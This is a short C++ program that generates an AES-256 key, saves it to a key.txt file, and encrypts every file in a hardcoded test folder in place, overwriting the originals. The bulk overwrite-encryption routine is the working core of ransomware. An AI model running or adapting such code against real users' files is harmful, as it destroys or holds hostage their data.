#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <openssl/aes.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

std::string generateKey(size_t length) {
    std::string key(length, '\0');
    RAND_bytes(reinterpret_cast<unsigned char*>(&key[0]), length);
    return key;
}

std::vector<unsigned char> padData(const std::vector<unsigned char>& data) {
    std::vector<unsigned char> paddedData = data;
    size_t paddingLength = AES_BLOCK_SIZE - (data.size() % AES_BLOCK_SIZE);
    paddedData.insert(paddedData.end(), paddingLength, paddingLength);
    return paddedData;
}

void encryptFile(const fs::path& filePath, const unsigned char* key) {
    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) {
        return;
    }

    std::vector<unsigned char> data((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
    inputFile.close();


    std::vector<unsigned char> paddedData = padData(data);

    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_KEY encryptKey;
    AES_set_encrypt_key(key, 256, &encryptKey);
    std::vector<unsigned char> encryptedData(paddedData.size());
    AES_cbc_encrypt(paddedData.data(), encryptedData.data(), paddedData.size(), &encryptKey, iv, AES_ENCRYPT);

    std::ofstream outputFile(filePath, std::ios::binary);
    outputFile.write(reinterpret_cast<const char*>(iv), AES_BLOCK_SIZE);
    outputFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
    outputFile.close();
}

void processFolder(const fs::path& folderPath, const unsigned char* key) {
    for (const auto& entry : fs::directory_iterator(folderPath)) {
        if (entry.is_regular_file()) {
            encryptFile(entry.path(), key);
        }
    }
}

int main() {
    std::string folderPath = "E:\\Test\\Folder";
    fs::path folder(folderPath);
    fs::path parentPath = folder.parent_path();
    std::string keyFilePath = (parentPath / "key.txt").string();

    std::string key = generateKey(32); // 256 bits = 32 bytes

    std::ofstream keyFile(keyFilePath, std::ios::binary);
    keyFile.write(key.data(), key.size());
    keyFile.close();

    processFolder(folderPath, reinterpret_cast<const unsigned char*>(key.data()));

    return 0;
}
